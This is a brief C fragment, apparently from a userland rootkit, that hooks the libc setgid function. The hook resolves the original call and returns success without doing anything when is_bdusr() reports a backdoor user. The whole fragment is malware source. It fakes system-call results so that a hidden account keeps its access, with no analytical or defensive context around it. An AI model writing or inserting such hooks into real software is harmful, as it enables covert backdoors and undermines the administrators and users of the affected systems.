int setgid(gid_t gid)
{
    HOOK(o_setgid, CSETGID);
    if(is_bdusr()) return 0;
    return o_setgid(gid);
}
